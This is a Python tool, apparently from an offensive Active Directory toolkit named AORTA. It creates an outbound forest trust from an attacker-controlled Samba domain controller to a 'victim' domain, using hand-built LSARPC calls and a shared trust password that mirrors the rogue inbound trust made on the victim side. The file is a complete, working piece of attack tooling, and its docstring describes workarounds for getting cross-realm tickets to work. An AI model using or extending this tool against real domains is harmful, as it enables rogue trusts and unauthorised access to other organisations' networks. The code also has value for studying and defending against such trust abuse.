#!/usr/bin/env python3
"""
trust-create.py - attacker-side OUTGOING forest trust creator for AORTA.

The victim-side `aorta` tool creates the INBOUND trust with the shared password
in its IncomingAuthenticationInformation slot. This mirrors it on the attacker
forest: a pure-local LsarCreateTrustedDomainEx (opnum 51) that creates an
OUTGOING trust with the SAME shared password in the OutgoingAuthenticationInformation
slot, plus LsarSetForestTrustInformation (opnum 74) for the peer TLN.

It authenticates ONLY to the attacker's own Samba DC (LSARPC over SMB, NTLM as a
local Administrator). The victim forest is NEVER contacted, and no victim-domain
credentials are used - the entire point of the attacker side of AORTA. The peer
(victim) domain SID is supplied by the caller (standard recon output, not a secret).

CAVEAT (Samba only): Samba's lsa_CreateTrustedDomainEx (opnum 51) silently
IGNORES the AuthenticationInformation argument - "More investigation required
here, do not create secrets for now" (source4/rpc_server/lsa/dcesrv_lsa.c). So
the TDO is created with NO trust password and the KDC derives no trust keys:
cross-realm referral TGTs fail with KRB_AP_ERR_NOT_US ("The ticket isn't for
us"). Windows AD stores the secret, which is why the victim-side aorta tool
needs no such patch. The start-aorta-dc.sh wrapper therefore stores
trustAuthOutgoing directly in sam.ldb via samba/trust-secret.py (Samba's own
NDR serialization, same bytes dcesrv would store for CreateTrustedDomainEx2).
The auth info is still sent here for symmetry with the aorta tool.

LSARPC opnums 51/74/25/34 are not wired into the installed impacket lsad module,
so the NDR stubs are defined here (adapted from the aorta victim-side tool).

Usage (see also the samba/start-aorta-dc.sh wrapper which fills discovered.env values):
  python3 samba/trust-create.py create \
      --dc 127.0.0.1 --user Administrator --password 'Password__42' --domain bytestorm.local \
      --peer-domain victim.local --peer-netbios VICTIM \
      --peer-sid S-1-5-21-1487982659-1829050783-2281216199 \
      --trust-password 'Password__42' [--attributes 2056] [--force]
  python3 samba/trust-create.py list --dc 127.0.0.1 --user Administrator --password '...' --domain bytestorm.local
  python3 samba/trust-create.py delete --sid S-1-5-21-... [same auth]
"""
import argparse
import datetime
import sys
import traceback
from typing import Any

from impacket import nt_errors
from impacket.dcerpc.v5 import lsad, transport
from impacket.dcerpc.v5.dtypes import (
    ACCESS_MASK,
    BOOLEAN,
    LARGE_INTEGER,
    NTSTATUS,
    NULL,
    RPC_SID,
    RPC_UNICODE_STRING,
    ULONG,
)
from impacket.dcerpc.v5.lsad import (
    LSA_FOREST_TRUST_RECORD_TYPE,
    LSAPR_AUTH_INFORMATION,
    LSAPR_HANDLE,
    LSAPR_TRUSTED_DOMAIN_AUTH_INFORMATION,
    LSAPR_TRUSTED_DOMAIN_INFORMATION_EX,
    DCERPCSessionError,
)
from impacket.dcerpc.v5.ndr import NDRCALL, NDRPOINTER, NDRSTRUCT, NDRUniConformantArray
from impacket.dcerpc.v5.rpcrt import DCERPCException

# impacket resolves a request's exception class via
# getattr(sys.modules[request.__module__], 'DCERPCSessionError'); the request
# classes below live in this module, so this name must exist here too.

TRUST_DIRECTION_OUTBOUND = 2
TRUST_TYPE_UPLEVEL = 2
TRUST_ATTRIBUTES_AORTA = 0x808  # FOREST_TRANSITIVE | ENABLE_TGT_DELEGATION

# Policy access required to create a trustedDomain + its secret (mirrors samba-tool).
POLICY_ACCESS = 0x00000001 | 0x00000020 | 0x00000040  # VIEW_LOCAL_INFO | TRUST_ADMIN | CREATE_SECRET
TRUSTED_ALL_ACCESS = 0x000F003F
DELETE_ACCESS = 0x00010000

STATUS_OBJECT_NAME_COLLISION = 0xC0000035
STATUS_NO_MORE_ENTRIES = 0x8000001A

TRUST_DIRECTIONS = {0: "disabled", 1: "inbound", 2: "outbound", 3: "bidirectional"}
TRUST_TYPES = {1: "downlevel (NT4)", 2: "uplevel (2000+)", 3: "MIT", 4: "DCE"}
TRUST_ATTRIBUTES = {
    0x00000001: "NON_TRANSITIVE",
    0x00000002: "UPLEVEL_ONLY",
    0x00000004: "QUARANTINED_DOMAIN",
    0x00000008: "FOREST_TRANSITIVE",
    0x00000010: "CROSS_ORGANIZATION (selective-auth)",
    0x00000020: "WITHIN_FOREST",
    0x00000040: "TREAT_AS_EXTERNAL",
    0x00000080: "USES_RC4_ENCRYPTION",
    0x00000200: "CROSS_ORGANIZATION_NO_TGT_DELEGATION",
    0x00000800: "CROSS_ORGANIZATION_ENABLE_TGT_DELEGATION",
}


# ===========================================================================
#  Trust RPC stubs (impacket's lsad does not wire up these opnums)
# ===========================================================================


class LsarCreateTrustedDomainEx(NDRCALL):
    opnum = 51
    structure = (
        ("PolicyHandle", LSAPR_HANDLE),
        ("TrustedDomainInformation", LSAPR_TRUSTED_DOMAIN_INFORMATION_EX),
        ("AuthenticationInformation", LSAPR_TRUSTED_DOMAIN_AUTH_INFORMATION),
        ("DesiredAccess", ACCESS_MASK),
    )


class LsarCreateTrustedDomainExResponse(NDRCALL):
    structure = (("TrustedDomainHandle", LSAPR_HANDLE), ("ErrorCode", NTSTATUS))


class LsarOpenTrustedDomain(NDRCALL):
    opnum = 25
    structure = (
        ("PolicyHandle", LSAPR_HANDLE),
        ("TrustedDomainSid", RPC_SID),
        ("DesiredAccess", ACCESS_MASK),
    )


class LsarOpenTrustedDomainResponse(NDRCALL):
    structure = (("TrustedDomainHandle", LSAPR_HANDLE), ("ErrorCode", NTSTATUS))


class LsarDeleteObject(NDRCALL):
    opnum = 34
    structure = (("ObjectHandle", LSAPR_HANDLE),)


class LsarDeleteObjectResponse(NDRCALL):
    structure = (("ObjectHandle", LSAPR_HANDLE), ("ErrorCode", NTSTATUS))


# Forest trust info (LsarSetForestTrustInformation opnum 74).
# The LSA_FOREST_TRUST_DATA union is ENCAPSULATED: the record carries a 4-byte
# switch tag right before the arm data. impacket's union omits it, so we inline
# it as UnionTag. Top-level-name strings use MaximumLength = Length + 2 and
# WSTR MaximumCount = chars + 1 (NUL-inclusive) - see make_trust_string().


class LSA_FOREST_TRUST_RECORD(NDRSTRUCT):
    structure = (
        ("Flags", ULONG),
        ("ForestTrustType", LSA_FOREST_TRUST_RECORD_TYPE),
        ("Time", LARGE_INTEGER),
        ("UnionTag", ULONG),  # encapsulated-union switch (ForestTrustTopLevelName=0)
        ("TopLevelName", RPC_UNICODE_STRING),
    )


class PLSA_FOREST_TRUST_RECORD(NDRPOINTER):
    referent = (("Data", LSA_FOREST_TRUST_RECORD),)


class LSA_FOREST_TRUST_RECORD_ARRAY(NDRUniConformantArray):
    item = PLSA_FOREST_TRUST_RECORD


class PLSA_FOREST_TRUST_RECORD_ARRAY(NDRPOINTER):
    referent = (("Data", LSA_FOREST_TRUST_RECORD_ARRAY),)


class LSA_FOREST_TRUST_INFORMATION(NDRSTRUCT):
    structure = (
        ("RecordCount", ULONG),
        ("Entries", PLSA_FOREST_TRUST_RECORD_ARRAY),
    )


class PLSA_FOREST_TRUST_COLLISION_INFORMATION(NDRPOINTER):
    referent = (("Data", NDRPOINTER),)


class LsarSetForestTrustInformation(NDRCALL):
    opnum = 74
    structure = (
        ("PolicyHandle", LSAPR_HANDLE),
        ("TrustedDomainName", RPC_UNICODE_STRING),
        ("HighestRecordType", LSA_FOREST_TRUST_RECORD_TYPE),
        ("ForestTrustInfo", LSA_FOREST_TRUST_INFORMATION),
        ("CheckOnly", BOOLEAN),
    )


class LsarSetForestTrustInformationResponse(NDRCALL):
    structure = (
        ("CollisionInfo", PLSA_FOREST_TRUST_COLLISION_INFORMATION),
        ("ErrorCode", NTSTATUS),
    )


# ===========================================================================
#  Helpers
# ===========================================================================


def make_rpc_sid(sid_str: str) -> RPC_SID:
    parts = sid_str.split("-")
    sid = RPC_SID()
    sid["Revision"] = int(parts[1])
    sid["SubAuthorityCount"] = len(parts) - 3
    sid["IdentifierAuthority"] = b"\x00\x00\x00\x00\x00" + bytes([int(parts[2])])
    sid["SubAuthority"] = [int(x) for x in parts[3:]]
    return sid


def filetime_now() -> int:
    epoch = datetime.datetime(1601, 1, 1, tzinfo=datetime.UTC)
    delta = datetime.datetime.now(datetime.UTC) - epoch
    return int(delta.total_seconds() * 10_000_000)


def make_trust_string(s: str) -> RPC_UNICODE_STRING:
    # RPC_UNICODE_STRING with the NUL-inclusive conventions Windows uses for
    # forest-trust strings: MaximumLength = Length + 2 and WSTR
    # MaximumCount = chars + 1 (impacket's defaults omit the terminator).
    u = RPC_UNICODE_STRING()
    u["Data"] = s
    u.fields["MaximumLength"] = len(s) * 2 + 2
    data_member: Any = u.fields["Data"]
    wstr: Any = data_member.fields["Data"]
    wstr.fields["MaximumCount"] = len(s) + 1
    return u


def decode_direction(v: int) -> str:
    return TRUST_DIRECTIONS.get(v, f"unknown({v})")


def decode_attributes(v: int) -> list[tuple[int, str]]:
    flags = [(bit, name) for bit, name in TRUST_ATTRIBUTES.items() if v & bit]
    unknown = v & ~sum(bit for bit, _ in flags)
    if unknown:
        flags.append((unknown, "RESERVED/UNKNOWN"))
    return flags


def connect(args: argparse.Namespace) -> tuple[Any, Any]:
    rpctransport = transport.DCERPCTransportFactory(rf"ncacn_np:{args.dc}[\PIPE\lsarpc]")
    rpctransport.set_credentials(args.user, args.password, args.domain)
    dce = rpctransport.get_dce_rpc()
    dce.connect()
    dce.bind(lsad.MSRPC_UUID_LSAD)
    policy_handle = lsad.hLsarOpenPolicy2(dce, POLICY_ACCESS)["PolicyHandle"]
    return dce, policy_handle


def get_trusts(dce: Any, policy_handle: Any) -> list[Any]:
    try:
        resp = lsad.hLsarEnumerateTrustedDomainsEx(dce, policy_handle)
    except DCERPCException as e:
        if getattr(e, "error_code", None) == STATUS_NO_MORE_ENTRIES:
            return []
        raise
    buf = resp["EnumerationBuffer"]
    if not buf["Entries"]:
        return []
    return list(buf["EnumerationBuffer"])


def print_trust(idx: int, e: Any) -> None:
    sid = e["Sid"]
    sid_str = sid.formatCanonical() if sid is not None else "(none)"
    attrs = e["TrustAttributes"]
    print(f"    [{idx}] {e['Name']} ({e['FlatName']})")
    print(f"        SID:         {sid_str}")
    print(f"        Direction:   {decode_direction(e['TrustDirection'])} ({e['TrustDirection']})")
    print(f"        Type:        {TRUST_TYPES.get(e['TrustType'], '?')} ({e['TrustType']})")
    print(f"        Attributes:  0x{attrs:x}")
    for bit, name in decode_attributes(attrs):
        print(f"            {name} (0x{bit:03x})")
    print()


def show_trusts(dce: Any, policy_handle: Any) -> None:
    trusts = get_trusts(dce, policy_handle)
    print(f"[+] Total trusts: {len(trusts)}\n")
    for i, e in enumerate(trusts, 1):
        print_trust(i, e)


def delete_trust_by_sid(dce: Any, policy_handle: Any, sid_str: str) -> None:
    open_req = LsarOpenTrustedDomain()
    open_req["PolicyHandle"] = policy_handle
    open_req["TrustedDomainSid"] = make_rpc_sid(sid_str)
    open_req["DesiredAccess"] = DELETE_ACCESS
    td_handle = dce.request(open_req)["TrustedDomainHandle"]
    del_req = LsarDeleteObject()
    del_req["ObjectHandle"] = td_handle
    dce.request(del_req)


def build_create_request(policy_handle: Any, args: argparse.Namespace) -> LsarCreateTrustedDomainEx:
    # OUTGOING trust: BYTESTORM trusts the peer (victim) domain.
    tdi = LSAPR_TRUSTED_DOMAIN_INFORMATION_EX()
    tdi["Name"] = args.peer_domain
    tdi["FlatName"] = args.peer_netbios
    tdi["Sid"] = make_rpc_sid(args.peer_sid)
    tdi["TrustDirection"] = TRUST_DIRECTION_OUTBOUND
    tdi["TrustType"] = TRUST_TYPE_UPLEVEL
    tdi["TrustAttributes"] = args.attributes

    # The shared trust password goes in the OUTGOING slot; it MUST match the
    # victim's INCOMING password (victim `aorta trust add --trust-password`).
    auth_info = LSAPR_AUTH_INFORMATION()
    auth_info["LastUpdateTime"] = 0
    auth_info["AuthType"] = 2  # TRUST_AUTH_TYPE_CLEAR (MS-LSAD 2.2.2.5: 0x2 = plaintext)
    pwd_bytes = args.trust_password.encode("utf-16-le")
    auth_info["AuthInfoLength"] = len(pwd_bytes)
    auth_info["AuthInfo"] = pwd_bytes

    tai = LSAPR_TRUSTED_DOMAIN_AUTH_INFORMATION()
    tai["IncomingAuthInfos"] = 0
    tai["IncomingAuthenticationInformation"] = NULL
    tai["IncomingPreviousAuthenticationInformation"] = NULL
    tai["OutgoingAuthInfos"] = 1
    tai["OutgoingAuthenticationInformation"] = auth_info
    tai["OutgoingPreviousAuthenticationInformation"] = NULL

    request = LsarCreateTrustedDomainEx()
    request["PolicyHandle"] = policy_handle
    request["TrustedDomainInformation"] = tdi
    request["AuthenticationInformation"] = tai
    request["DesiredAccess"] = TRUSTED_ALL_ACCESS
    return request


def set_forest_trust_info(dce: Any, policy_handle: Any, domain_name: str) -> Any:
    rec = LSA_FOREST_TRUST_RECORD()
    rec["Flags"] = 0
    rec["ForestTrustType"] = 0  # ForestTrustTopLevelName
    rec["Time"] = filetime_now()
    rec["UnionTag"] = 0
    rec["TopLevelName"] = make_trust_string(domain_name)

    info = LSA_FOREST_TRUST_INFORMATION()
    info["RecordCount"] = 1
    p = PLSA_FOREST_TRUST_RECORD()
    p["Data"] = rec
    info["Entries"] = [p]

    request = LsarSetForestTrustInformation()
    request["PolicyHandle"] = policy_handle
    request["TrustedDomainName"] = make_trust_string(domain_name)
    request["HighestRecordType"] = 0
    request["ForestTrustInfo"] = info
    request["CheckOnly"] = 0
    return dce.request(request)


def do_set_forest_trust_info(dce: Any, policy_handle: Any, domain_name: str) -> bool:
    print(f"[*] Setting forest trust info TLN={domain_name} (opnum 74)...")
    try:
        resp = set_forest_trust_info(dce, policy_handle, domain_name)
    except DCERPCException as e:
        code = getattr(e, "error_code", None)
        print(f"[-] LsarSetForestTrustInformation failed: 0x{code:08x} {e}" if code else f"[-] {e}")
        return False
    code = resp["ErrorCode"] & 0xFFFFFFFF
    if code == 0:
        print(f"[+] Forest trust info set (top-level name: {domain_name})")
        return True
    print(f"[-] LsarSetForestTrustInformation failed: 0x{code:08x}")
    return False


def handle_create_error(exc: Exception) -> int | None:
    error_code = getattr(exc, "error_code", None)
    print(f"[-] LsarCreateTrustedDomainEx failed: {exc}")
    if error_code:
        status_name, status_desc = nt_errors.ERROR_MESSAGES.get(error_code, ("Unknown", ""))
        print(f"[-] Status: 0x{error_code:08x} - {status_name}: {status_desc}")
    return error_code


# ===========================================================================
#  Commands
# ===========================================================================


def cmd_create(args: argparse.Namespace) -> int:
    print(
        f"[*] Creating OUTGOING forest trust -> {args.peer_domain} "
        f"({args.peer_netbios}, {args.peer_sid}) attrs=0x{args.attributes:x}"
    )
    dce, policy_handle = connect(args)
    try:
        request = build_create_request(policy_handle, args)
        print("[*] LsarCreateTrustedDomainEx (opnum 51)...")
        try:
            dce.request(request)
        except DCERPCException as e:
            code = handle_create_error(e)
            if code == STATUS_OBJECT_NAME_COLLISION and args.force:
                print(f"[*] --force: deleting existing trust {args.peer_sid} and recreating")
                try:
                    delete_trust_by_sid(dce, policy_handle, args.peer_sid)
                    print("[+] Existing trust deleted")
                except Exception as e2:  # noqa: BLE001
                    print(f"[-] Force-delete failed: {e2}")
                    return 1
                print("[*] Recreating trust...")
                try:
                    dce.request(request)
                except DCERPCException as e3:
                    handle_create_error(e3)
                    return 1
            else:
                return 1
        except Exception as e:  # noqa: BLE001
            print(f"[-] Unexpected error: {e}")
            traceback.print_exc()
            return 1

        print("[+] TRUST CREATED (outgoing, 0x{:x})".format(args.attributes))
        do_set_forest_trust_info(dce, policy_handle, args.peer_domain)
        print(f"\n[+] Outgoing trust ready: {args.domain} -> {args.peer_domain}")
        print("\n[*] Current trusts:")
        show_trusts(dce, policy_handle)
        return 0
    finally:
        dce.disconnect()


def cmd_list(args: argparse.Namespace) -> int:
    dce, policy_handle = connect(args)
    try:
        print(f"[*] Enumerating trusted domains on {args.dc} ...")
        show_trusts(dce, policy_handle)
        return 0
    finally:
        dce.disconnect()


def cmd_delete(args: argparse.Namespace) -> int:
    dce, policy_handle = connect(args)
    try:
        print(f"[*] Deleting trust with SID {args.sid}")
        delete_trust_by_sid(dce, policy_handle, args.sid)
        print("[+] Deleted")
        return 0
    finally:
        dce.disconnect()


def add_common_args(p: argparse.ArgumentParser) -> None:
    p.add_argument("--dc", required=True, help="attacker DC LSARPC target (host-networked: 127.0.0.1)")
    p.add_argument("--user", required=True, help="attacker-domain admin (e.g. Administrator)")
    p.add_argument("--password", required=True, help="admin password (NTLM)")
    p.add_argument("--domain", required=True, help="attacker realm FQDN (e.g. bytestorm.local)")


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        prog="trust-create.py",
        description="Attacker-side OUTGOING forest trust creator for AORTA (local-only LSA, no victim creds)",
    )
    top = parser.add_subparsers(dest="cmd", required=True, metavar="{create,list,delete}")

    p_create = top.add_parser("create", help="create the outgoing forest trust (local LSA only)")
    add_common_args(p_create)
    p_create.add_argument("--peer-domain", required=True, help="victim forest FQDN (e.g. victim.local)")
    p_create.add_argument("--peer-netbios", required=True, help="victim NetBIOS name (e.g. VICTIM)")
    p_create.add_argument("--peer-sid", required=True, help="victim domain SID (recon; not a secret)")
    p_create.add_argument("--trust-password", required=True, help="shared trust secret (must match victim inbound)")
    p_create.add_argument("--attributes", type=lambda x: int(x, 0), default=TRUST_ATTRIBUTES_AORTA,
                          help=f"trustAttributes (default 0x{TRUST_ATTRIBUTES_AORTA:x} = 2056)")
    p_create.add_argument("--force", action="store_true", help="delete an existing same-SID trust first")

    p_list = top.add_parser("list", help="enumerate local trusts")
    add_common_args(p_list)

    p_del = top.add_parser("delete", help="delete a local trust by SID")
    add_common_args(p_del)
    p_del.add_argument("--sid", required=True, help="SID of the trust to delete")

    return parser


def main() -> int:
    args = build_parser().parse_args()
    if args.cmd == "create":
        return cmd_create(args)
    if args.cmd == "list":
        return cmd_list(args)
    if args.cmd == "delete":
        return cmd_delete(args)
    return 2


if __name__ == "__main__":
    sys.exit(main())
